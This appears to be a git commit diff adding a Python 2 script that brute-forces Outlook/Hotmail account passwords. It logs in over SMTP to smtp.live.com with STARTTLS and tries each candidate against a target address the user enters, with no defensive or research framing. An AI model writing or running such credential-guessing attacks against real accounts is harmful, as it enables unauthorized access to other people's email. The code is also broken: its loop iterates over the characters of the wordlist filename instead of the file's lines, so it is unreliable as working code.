89d78ac243a66833eafbe75bc19985006377fe57
clash <35383814+yazeed33@users.noreply.github.com>
2018-09-20 13:49:18 +0300

    Update OUTLOOK_BRUTE_FORCE.py

--- OUTLOOK_BRUTE_FORCE.py
+++ OUTLOOK_BRUTE_FORCE.py
@@ -6,3 +6,20 @@ print("+                                                          +")
 print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
 
 import smtplib
+
+smtpserver = smtplib.SMTP("smtp.live.com",587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+email = raw_input("Enter Email Target: ")
+print("++++++++++++++++++++++++++++++++++++++++")
+passwfile = raw_input("Enter WordList File: ")
+
+for password in passwfile:
+    try:
+        smtpserver.login(email,password)
+        print("[+] PASS FOND ===> %s ") % password
+        break;
+    except smtplib.SMTPAuthenticationError:
+        print("[!] PASS INCORRECT ===> %s ") % password    
+    
